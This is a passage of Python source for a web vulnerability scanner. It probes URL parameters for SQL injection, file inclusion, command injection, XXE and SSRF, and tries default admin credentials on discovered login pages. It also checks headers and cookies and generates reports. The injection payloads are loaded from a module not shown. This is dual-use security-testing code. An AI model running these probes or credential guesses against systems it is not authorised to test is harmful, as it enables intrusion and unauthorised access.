                                description=f'The parameter "{param_name}" is vulnerable to time-based blind SQL injection.',
                                evidence=f'Payload: {payload}\nBaseline time: {avg_baseline:.2f}s\nPayload time: {response_time:.2f}s',
                                impact='An attacker could extract sensitive data from the database.',
                                remediation='Use parameterized queries and input validation.',
                                cvss_score=8.6,
                                cwe_id='CWE-89',
                                payload=payload
                            )
                            self.findings.append(finding)
                            self.logger.log_vulnerability(finding)
                            
            except Exception as e:
                self.logger.log_error(e, f"sqli_time_test_{url}")
    
    def _detect_sql_errors(self, content: str, payload_data: Dict) -> bool:
        """Detect SQL error patterns in response"""
        detection_pattern = payload_data.get('detection_pattern')
        if detection_pattern:
            return bool(re.search(detection_pattern, content, re.IGNORECASE))
        
        # Common SQL error patterns
        sql_errors = [
            r'sql syntax.*mysql',
            r'warning.*mysql_',
            r'valid mysql result',
            r'postgresql.*error',
            r'warning.*pg_',
            r'valid postgresql result',
            r'oracle.*error',
            r'warning.*oci_',
            r'microsoft.*odbc.*sql server',
            r'sqlite.*error',
            r'sql server.*error'
        ]
        
        return any(re.search(pattern, content, re.IGNORECASE) for pattern in sql_errors)
    
    def _create_sqli_finding(self, url: str, payload: str, payload_data: Dict, parameter: str, evidence: str) -> VulnerabilityFinding:
        """Create SQL injection vulnerability finding"""
        return VulnerabilityFinding(
            id=str(uuid.uuid4()),
            url=url,
            vulnerability_type='SQL Injection',
            severity='high',
            confidence='high',
            title=f'SQL injection in parameter "{parameter}"',
            description=f'The parameter "{parameter}" is vulnerable to SQL injection attacks.',
            evidence=f'Payload: {payload}\nError response: {evidence}',
            impact='An attacker could read, modify, or delete database contents.',
            remediation='Use parameterized queries, input validation, and least privilege database access.',
            cvss_score=8.6,
            cwe_id='CWE-89',
            references=[
                'https://owasp.org/www-community/attacks/SQL_Injection',
                'https://cwe.mitre.org/data/definitions/89.html'
            ],
            payload=payload,
            request_data={'url': url, 'parameter': parameter},
            response_data={'evidence': evidence}
        )
    
    async def _test_lfi_vulnerabilities(self, url: str):
        """Test for Local File Inclusion vulnerabilities"""
        payloads = self.payload_manager.get_payloads('lfi', limit=self.config.get('payload_limit', 3))
        
        parsed = urlparse(url)
        if not parsed.query:
            return
        
        params = parse_qs(parsed.query)
        
        for payload_data in payloads:
            payload = payload_data['payload']
            
            for param_name in params:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                
                try:
                    async with self.semaphore:
                        await self.rate_limiter.wait_if_needed()
                        
                        start_time = time.time()
                        async with self.session.get(test_url) as response:
                            response_time = time.time() - start_time
                            content = await response.text()
                            
                            self.logger.log_request('GET', test_url, response.status, response_time)
                            
                            # Check for LFI indicators
                            detection_pattern = payload_data.get('detection_pattern')
                            if detection_pattern and re.search(detection_pattern, content):
                                finding = VulnerabilityFinding(
                                    id=str(uuid.uuid4()),
                                    url=test_url,
                                    vulnerability_type='Local File Inclusion (LFI)',
                                    severity='high',
                                    confidence='high',
                                    title=f'LFI in parameter "{param_name}"',
                                    description=f'The parameter "{param_name}" allows local file inclusion.',
                                    evidence=f'Payload: {payload}\nFile content detected in response',
                                    impact='An attacker could read sensitive files from the server.',
                                    remediation='Implement proper input validation and file access controls.',
                                    cvss_score=7.5,
                                    cwe_id='CWE-22',
                                    payload=payload
                                )
                                self.findings.append(finding)
                                self.logger.log_vulnerability(finding)
                                
                except Exception as e:
                    self.logger.log_error(e, f"lfi_test_{url}")
    
    async def _test_command_injection(self, url: str):
        """Test for command injection vulnerabilities"""
        payloads = self.payload_manager.get_payloads('command_injection', limit=self.config.get('payload_limit', 3))
        
        parsed = urlparse(url)
        if not parsed.query:
            return
        
        params = parse_qs(parsed.query)
        
        for payload_data in payloads:
            payload = payload_data['payload']
            
            for param_name in params:
                test_params = params.copy()
                test_params[param_name] = [f"{params[param_name][0]}{payload}"]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                
                try:
                    async with self.semaphore:
                        await self.rate_limiter.wait_if_needed()
                        
                        start_time = time.time()
                        async with self.session.get(test_url) as response:
                            response_time = time.time() - start_time
                            content = await response.text()
                            
                            self.logger.log_request('GET', test_url, response.status, response_time)
                            
                            # Check for command execution indicators
                            detection_pattern = payload_data.get('detection_pattern')
                            if detection_pattern and re.search(detection_pattern, content):
                                finding = VulnerabilityFinding(
                                    id=str(uuid.uuid4()),
                                    url=test_url,
                                    vulnerability_type='Command Injection',
                                    severity='critical',
                                    confidence='high',
                                    title=f'Command injection in parameter "{param_name}"',
                                    description=f'The parameter "{param_name}" allows command execution.',
                                    evidence=f'Payload: {payload}\nCommand output detected in response',
                                    impact='An attacker could execute arbitrary commands on the server.',
                                    remediation='Implement strict input validation and avoid system calls with user input.',
                                    cvss_score=9.8,
                                    cwe_id='CWE-78',
                                    payload=payload
                                )
                                self.findings.append(finding)
                                self.logger.log_vulnerability(finding)
                                
                except Exception as e:
                    self.logger.log_error(e, f"command_injection_test_{url}")
    
    async def _test_xxe_vulnerabilities(self, url: str):
        """Test for XXE vulnerabilities"""
        payloads = self.payload_manager.get_payloads('xxe', limit=1)
        
        for payload_data in payloads:
            payload = payload_data['payload']
            
            try:
                async with self.semaphore:
                    await self.rate_limiter.wait_if_needed()
                    
                    headers = {'Content-Type': 'application/xml'}
                    
                    start_time = time.time()
                    async with self.session.post(url, data=payload, headers=headers) as response:
                        response_time = time.time() - start_time
                        content = await response.text()
                        
                        self.logger.log_request('POST', url, response.status, response_time)
                        
                        # Check for XXE indicators
                        detection_pattern = payload_data.get('detection_pattern')
                        if detection_pattern and re.search(detection_pattern, content):
                            finding = VulnerabilityFinding(
                                id=str(uuid.uuid4()),
                                url=url,
                                vulnerability_type='XML External Entity (XXE)',
                                severity='high',
                                confidence='high',
                                title='XXE vulnerability detected',
                                description='The application processes XML input without proper validation.',
                                evidence=f'XXE payload processed successfully',
                                impact='An attacker could read local files or perform SSRF attacks.',
                                remediation='Disable external entity processing in XML parsers.',
                                cvss_score=8.5,
                                cwe_id='CWE-611',
                                payload=payload
                            )
                            self.findings.append(finding)
                            self.logger.log_vulnerability(finding)
                            
            except Exception as e:
                self.logger.log_error(e, f"xxe_test_{url}")
    
    async def _test_ssrf_vulnerabilities(self, url: str):
        """Test for SSRF vulnerabilities"""
        payloads = self.payload_manager.get_payloads('ssrf', limit=self.config.get('payload_limit', 2))
        
        parsed = urlparse(url)
        if not parsed.query:
            return
        
        params = parse_qs(parsed.query)
        
        for payload_data in payloads:
            payload = payload_data['payload']
            
            for param_name in params:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                
                try:
                    async with self.semaphore:
                        await self.rate_limiter.wait_if_needed()
                        
                        start_time = time.time()
                        async with self.session.get(test_url) as response:
                            response_time = time.time() - start_time
                            content = await response.text()
                            
                            self.logger.log_request('GET', test_url, response.status, response_time)
                            
                            # Check for SSRF indicators
                            detection_pattern = payload_data.get('detection_pattern')
                            if detection_pattern and re.search(detection_pattern, content):
                                finding = VulnerabilityFinding(
                                    id=str(uuid.uuid4()),
                                    url=test_url,
                                    vulnerability_type='Server-Side Request Forgery (SSRF)',
                                    severity='high',
                                    confidence='medium',
                                    title=f'SSRF in parameter "{param_name}"',
                                    description=f'The parameter "{param_name}" allows server-side requests.',
                                    evidence=f'SSRF payload response detected',
                                    impact='An attacker could access internal services or perform port scanning.',
                                    remediation='Implement URL validation and whitelist allowed destinations.',
                                    cvss_score=8.1,
                                    cwe_id='CWE-918',
                                    payload=payload
                                )
                                self.findings.append(finding)
                                self.logger.log_vulnerability(finding)
                                
                except Exception as e:
                    self.logger.log_error(e, f"ssrf_test_{url}")
    
    async def _advanced_testing_phase(self):
        """Phase 3: Advanced security testing"""
        self.logger.logger.info("Phase 3: Advanced Security Testing")
        
        # Security header analysis
        await self._analyze_security_headers()
        
        # SSL/TLS analysis
        await self._analyze_ssl_tls()
        
        # Authentication testing
        await self._test_authentication_bypass()
        
        # Session management testing
        await self._test_session_management()
        
        # Business logic testing
        await self._test_business_logic()
        
        self.logger.logger.info("Advanced testing completed")
    
    async def _analyze_security_headers(self):
        """Analyze security headers"""
        try:
            async with self.session.get(self.target_url) as response:
                headers = response.headers
                
                # Check for missing security headers
                security_headers = {
                    'Strict-Transport-Security': 'HSTS header missing',
                    'Content-Security-Policy': 'CSP header missing',
                    'X-Frame-Options': 'X-Frame-Options header missing',
                    'X-Content-Type-Options': 'X-Content-Type-Options header missing',
                    'X-XSS-Protection': 'X-XSS-Protection header missing',
                    'Referrer-Policy': 'Referrer-Policy header missing'
                }
                
                for header, description in security_headers.items():
                    if header not in headers:
                        finding = VulnerabilityFinding(
                            id=str(uuid.uuid4()),
                            url=self.target_url,
                            vulnerability_type='Missing Security Header',
                            severity='low',
                            confidence='high',
                            title=f'Missing {header} header',
                            description=description,
                            evidence=f'Response headers: {dict(headers)}',
                            impact='Missing security headers can lead to various attacks.',
                            remediation=f'Implement {header} header with appropriate values.',
                            cvss_score=3.1,
                            cwe_id='CWE-693'
                        )
                        self.findings.append(finding)
                        
        except Exception as e:
            self.logger.log_error(e, "security_headers_analysis")
    
    async def _analyze_ssl_tls(self):
        """Analyze SSL/TLS configuration"""
        parsed = urlparse(self.target_url)
        if parsed.scheme != 'https':
            finding = VulnerabilityFinding(
                id=str(uuid.uuid4()),
                url=self.target_url,
                vulnerability_type='Insecure Transport',
                severity='medium',
                confidence='high',
                title='HTTP instead of HTTPS',
                description='The application uses HTTP instead of HTTPS.',
                evidence=f'URL scheme: {parsed.scheme}',
                impact='Data transmitted over HTTP can be intercepted.',
                remediation='Implement HTTPS with valid SSL/TLS certificates.',
                cvss_score=5.3,
                cwe_id='CWE-319'
            )
            self.findings.append(finding)
            return
        
        # Additional SSL/TLS checks would go here
        # (certificate validation, cipher suites, etc.)
    
    async def _test_authentication_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        # Test common authentication bypass techniques
        bypass_tests = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', ''),
            ('', ''),
            ('admin', 'admin123')
        ]
        
        # Look for login forms
        login_urls = [url for url in self.discovered_urls if any(keyword in url.lower() for keyword in ['login', 'signin', 'auth'])]
        
        for login_url in login_urls[:3]:  # Limit testing
            for username, password in bypass_tests:
                try:
                    login_data = {
                        'username': username,
                        'password': password,
                        'user': username,
                        'pass': password,
                        'email': username,
                        'login': 'Login'
                    }
                    
                    async with self.session.post(login_url, data=login_data) as response:
                        content = await response.text()
                        
                        # Check for successful login indicators
                        success_indicators = ['dashboard', 'welcome', 'logout', 'profile']
                        if any(indicator in content.lower() for indicator in success_indicators):
                            finding = VulnerabilityFinding(
                                id=str(uuid.uuid4()),
                                url=login_url,
                                vulnerability_type='Authentication Bypass',
                                severity='critical',
                                confidence='medium',
                                title='Weak authentication credentials',
                                description=f'Login successful with credentials: {username}/{password}',
                                evidence=f'Login response contains success indicators',
                                impact='Unauthorized access to protected resources.',
                                remediation='Implement strong password policies and account lockout.',
                                cvss_score=9.1,
                                cwe_id='CWE-287'
                            )
                            self.findings.append(finding)
                            break
                            
                except Exception as e:
                    self.logger.log_error(e, f"auth_bypass_test_{login_url}")
    
    async def _test_session_management(self):
        """Test session management vulnerabilities"""
        try:
            # Get initial session
            async with self.session.get(self.target_url) as response:
                cookies = response.cookies
                
                for cookie in cookies:
                    # Check cookie security attributes
                    if not cookie.get('secure', False):
                        finding = VulnerabilityFinding(
                            id=str(uuid.uuid4()),
                            url=self.target_url,
                            vulnerability_type='Insecure Cookie',
                            severity='medium',
                            confidence='high',
                            title=f'Cookie "{cookie.key}" missing Secure flag',
                            description='Session cookie transmitted without Secure flag.',
                            evidence=f'Cookie: {cookie.key}={cookie.value}',
                            impact='Session cookies can be intercepted over HTTP.',
                            remediation='Set Secure flag on all session cookies.',
                            cvss_score=4.3,
                            cwe_id='CWE-614'
                        )
                        self.findings.append(finding)
                    
                    if not cookie.get('httponly', False):
                        finding = VulnerabilityFinding(
                            id=str(uuid.uuid4()),
                            url=self.target_url,
                            vulnerability_type='Insecure Cookie',
                            severity='medium',
                            confidence='high',
                            title=f'Cookie "{cookie.key}" missing HttpOnly flag',
                            description='Session cookie accessible via JavaScript.',
                            evidence=f'Cookie: {cookie.key}={cookie.value}',
                            impact='Session cookies vulnerable to XSS attacks.',
                            remediation='Set HttpOnly flag on all session cookies.',
                            cvss_score=4.3,
                            cwe_id='CWE-1004'
                        )
                        self.findings.append(finding)
                        
        except Exception as e:
            self.logger.log_error(e, "session_management_test")
    
    async def _test_business_logic(self):
        """Test for business logic vulnerabilities"""
        # This is a simplified example - real business logic testing
        # would be much more comprehensive and application-specific
        
        # Test for price manipulation (if e-commerce indicators found)
        ecommerce_indicators = ['cart', 'price', 'checkout', 'payment', 'order']
        
        for url in self.discovered_urls:
            if any(indicator in url.lower() for indicator in ecommerce_indicators):
                # Test negative prices, zero prices, etc.
                test_params = {'price': '-1', 'amount': '0', 'quantity': '-5'}
                
                for param, value in test_params.items():
                    test_url = f"{url}?{param}={value}"
                    
                    try:
                        async with self.session.get(test_url) as response:
                            if response.status == 200:
                                finding = VulnerabilityFinding(
                                    id=str(uuid.uuid4()),
                                    url=test_url,
                                    vulnerability_type='Business Logic Flaw',
                                    severity='medium',
                                    confidence='low',
                                    title=f'Potential price manipulation in {param}',
                                    description=f'Application accepts negative/zero values for {param}.',
                                    evidence=f'Parameter {param} accepted value {value}',
                                    impact='Potential financial loss through price manipulation.',
                                    remediation='Implement proper business logic validation.',
                                    cvss_score=5.3,
                                    cwe_id='CWE-840'
                                )
                                self.findings.append(finding)
                                
                    except Exception as e:
                        self.logger.log_error(e, f"business_logic_test_{url}")
    
    async def _verification_phase(self):
        """Phase 4: Verification and false positive reduction"""
        self.logger.logger.info("Phase 4: Verification and False Positive Reduction")
        
        # Verify high-confidence findings
        verified_count = 0
        for finding in self.findings:
            if finding.confidence == 'high' and finding.severity in ['critical', 'high']:
                if await self._verify_finding(finding):
                    finding.verified = True
                    verified_count += 1
                else:
                    finding.false_positive = True
        
        self.logger.logger.info(f"Verification completed: {verified_count} findings verified")
    
    async def _verify_finding(self, finding: VulnerabilityFinding) -> bool:
        """Verify a specific finding to reduce false positives"""
        try:
            # Re-test the vulnerability with the same payload
            if finding.payload:
                # Simplified verification - in practice, this would be more sophisticated
                async with self.session.get(finding.url) as response:
                    content = await response.text()
                    
                    # Check if the vulnerability still exists
                    if finding.vulnerability_type == 'Cross-Site Scripting (XSS)':
                        return finding.payload in content
                    elif 'SQL Injection' in finding.vulnerability_type:
                        return self._detect_sql_errors(content, {'detection_pattern': None})
                    
            return True  # Default to verified if we can't re-test
            
        except Exception as e:
            self.logger.log_error(e, f"verification_{finding.id}")
            return False
    
    async def _generate_comprehensive_report(self) -> Dict[str, Any]:
        """Generate comprehensive security report"""
        self.metrics.end_time = datetime.now()
        self.metrics.vulnerabilities_found = len(self.findings)
        self.metrics.false_positives = len([f for f in self.findings if f.false_positive])
        
        # Calculate severity distribution
        severity_counts = defaultdict(int)
        for finding in self.findings:
            if not finding.false_positive:
                severity_counts[finding.severity] += 1
        
        # Calculate risk score
        risk_score = self._calculate_risk_score()
        
        # Generate executive summary
        executive_summary = self._generate_executive_summary(risk_score, severity_counts)
        
        report = {
            'scan_info': {
                'target_url': self.target_url,
                'scan_start': self.metrics.start_time.isoformat(),
                'scan_end': self.metrics.end_time.isoformat(),
                'scan_duration': str(self.metrics.end_time - self.metrics.start_time),
                'scanner_version': '2.0',
                'scan_id': str(uuid.uuid4())
            },
            'executive_summary': executive_summary,
            'risk_assessment': {
                'overall_risk_score': risk_score,
                'risk_level': self._get_risk_level(risk_score),
                'severity_distribution': dict(severity_counts)
            },
            'scan_metrics': {
                'total_requests': self.metrics.total_requests,
                'successful_requests': self.metrics.successful_requests,
                'failed_requests': self.metrics.failed_requests,
                'urls_discovered': len(self.discovered_urls),
                'urls_scanned': len(self.scanned_urls),
                'vulnerabilities_found': self.metrics.vulnerabilities_found,
                'false_positives': self.metrics.false_positives,
                'verified_findings': len([f for f in self.findings if f.verified])
            },
            'technology_fingerprint': {
                'detected_technologies': list(self.technology_stack),
                'server_fingerprint': self.fingerprints
            },
            'vulnerabilities': [
                {
                    'id': f.id,
                    'url': f.url,
                    'type': f.vulnerability_type,
                    'severity': f.severity,
                    'confidence': f.confidence,
                    'title': f.title,
                    'description': f.description,
                    'impact': f.impact,
                    'remediation': f.remediation,
                    'cvss_score': f.cvss_score,
                    'cwe_id': f.cwe_id,
                    'references': f.references,
                    'verified': f.verified,
                    'false_positive': f.false_positive,
                    'timestamp': f.timestamp.isoformat()
                }
                for f in self.findings if not f.false_positive
            ],
            'recommendations': self._generate_recommendations(),
            'compliance': self._assess_compliance()
        }
        
        # Save report
        await self._save_report(report)
        
        return report
    
    def _calculate_risk_score(self) -> float:
        """Calculate overall risk score (0-10)"""
        if not self.findings:
            return 1.0
        
        severity_weights = {
            'critical': 10,
            'high': 7,
            'medium': 4,
            'low': 1
        }
        
        total_score = 0
        verified_findings = [f for f in self.findings if not f.false_positive]
        
        for finding in verified_findings:
            weight = severity_weights.get(finding.severity, 1)
            confidence_multiplier = 1.0 if finding.confidence == 'high' else 0.7 if finding.confidence == 'medium' else 0.4
            total_score += weight * confidence_multiplier
        
        # Normalize to 0-10 scale
        max_possible_score = len(verified_findings) * 10
        if max_possible_score == 0:
            return 1.0
        
        normalized_score = (total_score / max_possible_score) * 10
        return min(10.0, max(1.0, normalized_score))
    
    def _get_risk_level(self, risk_score: float) -> str:
        """Convert risk score to risk level"""
        if risk_score >= 8.0:
            return 'CRITICAL'
        elif risk_score >= 6.0:
            return 'HIGH'
        elif risk_score >= 4.0:
            return 'MEDIUM'
        else:
            return 'LOW'
    
    def _generate_executive_summary(self, risk_score: float, severity_counts: Dict) -> str:
        """Generate executive summary"""
        risk_level = self._get_risk_level(risk_score)
        total_vulns = sum(severity_counts.values())
        
        summary = f"""
EXECUTIVE SUMMARY

The security assessment of {self.target_url} has been completed. The scan identified {total_vulns} security vulnerabilities with an overall risk score of {risk_score:.1f}/10 ({risk_level} risk).

Key Findings:
- Critical vulnerabilities: {severity_counts.get('critical', 0)}
- High severity vulnerabilities: {severity_counts.get('high', 0)}
- Medium severity vulnerabilities: {severity_counts.get('medium', 0)}
- Low severity vulnerabilities: {severity_counts.get('low', 0)}

Immediate attention is required for critical and high severity vulnerabilities to prevent potential security breaches.
        """.strip()
        
        return summary
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations based on findings"""
        recommendations = []
        
        # General recommendations
        recommendations.extend([
            "Implement a Web Application Firewall (WAF)",
            "Regular security testing and code reviews",
            "Keep all software components up to date",
            "Implement proper input validation and output encoding",
            "Use parameterized queries to prevent SQL injection",
            "Implement Content Security Policy (CSP) headers",
            "Enable security headers (HSTS, X-Frame-Options, etc.)",
            "Regular security awareness training for developers"
        ])
        
        # Specific recommendations based on findings
        vuln_types = {f.vulnerability_type for f in self.findings if not f.false_positive}
        
        if any('XSS' in vtype for vtype in vuln_types):
            recommendations.insert(0, "Implement comprehensive XSS protection measures")
        
        if any('SQL' in vtype for vtype in vuln_types):
            recommendations.insert(0, "Urgent: Fix SQL injection vulnerabilities")
        
        if any('Command' in vtype for vtype in vuln_types):
            recommendations.insert(0, "Critical: Address command injection vulnerabilities immediately")
        
        return recommendations[:10]  # Return top 10 recommendations
    
    def _assess_compliance(self) -> Dict[str, Any]:
        """Assess compliance with security standards"""
        compliance = {
            'OWASP_Top_10': {
                'score': 0,
                'issues': []
            },
            'PCI_DSS': {
                'score': 0,
                'issues': []
            }
        }
        
        # OWASP Top 10 assessment
        owasp_issues = []
        for finding in self.findings:
            if not finding.false_positive:
                if 'Injection' in finding.vulnerability_type or 'XSS' in finding.vulnerability_type:
                    owasp_issues.append(f"A03:2021 - Injection: {finding.title}")
                elif 'Authentication' in finding.vulnerability_type:
                    owasp_issues.append(f"A07:2021 - Identification and Authentication Failures: {finding.title}")
                elif 'Session' in finding.vulnerability_type or 'Cookie' in finding.vulnerability_type:
                    owasp_issues.append(f"A02:2021 - Cryptographic Failures: {finding.title}")
        
        compliance['OWASP_Top_10']['issues'] = owasp_issues[:5]  # Top 5 issues
        compliance['OWASP_Top_10']['score'] = max(0, 100 - len(owasp_issues) * 10)
        
        return compliance
    
    async def _save_report(self, report: Dict[str, Any]):
        """Save comprehensive report to files"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Save JSON report
        json_filename = f"security_report_{timestamp}.json"
        with open(json_filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        # Save HTML report
        html_filename = f"security_report_{timestamp}.html"
        html_content = self._generate_html_report(report)
        with open(html_filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        self.logger.logger.info(f"Reports saved: {json_filename}, {html_filename}")
    
    def _generate_html_report(self, report: Dict[str, Any]) -> str:
        """Generate HTML report"""
        html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Assessment Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background: #2c3e50; color: white; padding: 20px; border-radius: 5px; }
        .summary { background: #ecf0f1; padding: 15px; margin: 20px 0; border-radius: 5px; }
        .vulnerability { border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 5px; }
        .critical { border-left: 5px solid #e74c3c; }
        .high { border-left: 5px solid #f39c12; }
        .medium { border-left: 5px solid #f1c40f; }
        .low { border-left: 5px solid #27ae60; }
        .severity { font-weight: bold; text-transform: uppercase; }
        .recommendations { background: #d5f4e6; padding: 15px; border-radius: 5px; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Security Assessment Report</h1>
        <p>Target: {target_url}</p>
        <p>Scan Date: {scan_date}</p>
        <p>Risk Level: <strong>{risk_level}</strong> ({risk_score}/10)</p>
    </div>
    
    <div class="summary">
        <h2>Executive Summary</h2>
        <pre>{executive_summary}</pre>
    </div>
    
    <div class="summary">
        <h2>Scan Metrics</h2>
        <table>
            <tr><th>Metric</th><th>Value</th></tr>
            <tr><td>Total Requests</td><td>{total_requests}</td></tr>
            <tr><td>URLs Discovered</td><td>{urls_discovered}</td></tr>
            <tr><td>Vulnerabilities Found</td><td>{vulnerabilities_found}</td></tr>
            <tr><td>Verified Findings</td><td>{verified_findings}</td></tr>
        </table>
    </div>
    
    <div>
        <h2>Vulnerabilities</h2>
        {vulnerabilities_html}
    </div>
    
    <div class="recommendations">
        <h2>Recommendations</h2>
        <ul>
        {recommendations_html}
        </ul>
    </div>
</body>
</html>
        """
        
        # Generate vulnerabilities HTML
        vulnerabilities_html = ""
        for vuln in report['vulnerabilities']:
            severity_class = vuln['severity'].lower()
            vulnerabilities_html += f"""
            <div class="vulnerability {severity_class}">
                <h3>{vuln['title']}</h3>
                <p><span class="severity {severity_class}">{vuln['severity']}</span> | 
                   CVSS: {vuln['cvss_score']} | 
                   Confidence: {vuln['confidence']}</p>
                <p><strong>URL:</strong> {vuln['url']}</p>
                <p><strong>Description:</strong> {vuln['description']}</p>
                <p><strong>Impact:</strong> {vuln['impact']}</p>
                <p><strong>Remediation:</strong> {vuln['remediation']}</p>
            </div>
            """
        
        # Generate recommendations HTML
        recommendations_html = ""
        for rec in report['recommendations']:
            recommendations_html += f"<li>{rec}</li>"
        
        return html_template.format(
            target_url=report['scan_info']['target_url'],
            scan_date=report['scan_info']['scan_start'],
            risk_level=report['risk_assessment']['risk_level'],
            risk_score=report['risk_assessment']['overall_risk_score'],
            executive_summary=report['executive_summary'],
            total_requests=report['scan_metrics']['total_requests'],
            urls_discovered=report['scan_metrics']['urls_discovered'],
            vulnerabilities_found=report['scan_metrics']['vulnerabilities_found'],
            verified_findings=report['scan_metrics']['verified_findings'],
            vulnerabilities_html=vulnerabilities_html,
            recommendations_html=recommendations_html
        )
    
    async def cleanup(self):
        """Cleanup resources"""
        if self.session:
            await self.session.close()
        
        self.logger.logger.info("Scanner cleanup completed")

async def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description="Commercial-Grade Vulnerability Scanner")
    parser.add_argument("url", help="Target URL to scan")
    parser.add_argument("--config", help="Configuration file path")
    parser.add_argument("--output", help="Output directory for reports")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads")
    parser.add_argument("--rate-limit", type=float, default=10, help="Requests per second")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout in seconds")
    parser.add_argument("--log-level", choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'], default='INFO')
    parser.add_argument("--verify-ssl", action="store_true", help="Verify SSL certificates")
    
    args = parser.parse_args()
    
    # Load configuration
    config = {
        'requests_per_second': args.rate_limit,
        'max_concurrent_requests': args.threads,
        'request_timeout': args.timeout,
        'log_level': args.log_level,
        'verify_ssl': args.verify_ssl
    }
    
    if args.config:
        try:
            with open(args.config, 'r') as f:
                file_config = json.load(f)
                config.update(file_config)
        except Exception as e:
            console.print(f"[red]Error loading config file: {e}[/red]")
            return
    
    # Initialize and run scanner
    scanner = CommercialVulnerabilityScanner(args.url, config)
    
    try:
        console.print(Panel.fit(
            f"[bold green]Commercial-Grade Vulnerability Scanner[/bold green]\n"
            f"Target: {args.url}\n"
            f"Rate Limit: {args.rate_limit} req/s\n"
            f"Threads: {args.threads}\n"
            f"Timeout: {args.timeout}s",
            title="🚀 Scan Configuration"
        ))
        
        # Run scan with progress tracking
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn(),
            console=console
        ) as progress:
            task = progress.add_task("Scanning...", total=100)
            
            # Run the scan
            report = await scanner.scan()
            
            progress.update(task, completed=100)
        
        # Display results
        console.print(Panel.fit(
            f"[bold green]Scan Completed Successfully![/bold green]\n"
            f"Vulnerabilities Found: {report['scan_metrics']['vulnerabilities_found']}\n"
            f"Risk Level: {report['risk_assessment']['risk_level']}\n"
            f"Risk Score: {report['risk_assessment']['overall_risk_score']:.1f}/10",
            title="📊 Scan Results"
        ))
        
        # Display top vulnerabilities
        if report['vulnerabilities']:
            vuln_table = Table(title="🔍 Top Vulnerabilities")
            vuln_table.add_column("Severity", style="red")
            vuln_table.add_column("Type", style="cyan")
            vuln_table.add_column("URL", style="blue")
            vuln_table.add_column("CVSS", style="yellow")
            
            for vuln in report['vulnerabilities'][:10]:  # Top 10
                vuln_table.add_row(
                    vuln['severity'].upper(),
                    vuln['type'],
                    vuln['url'][:50] + "..." if len(vuln['url']) > 50 else vuln['url'],
                    str(vuln['cvss_score'])
                )
            
            console.print(vuln_table)
        
    except KeyboardInterrupt:
        console.print("\n[yellow]Scan interrupted by user[/yellow]")
    except Exception as e:
        console.print(f"\n[red]Scan failed: {e}[/red]")
        raise
    finally:
        await scanner.cleanup()

if __name__ == "__main__":
    asyncio.run(main())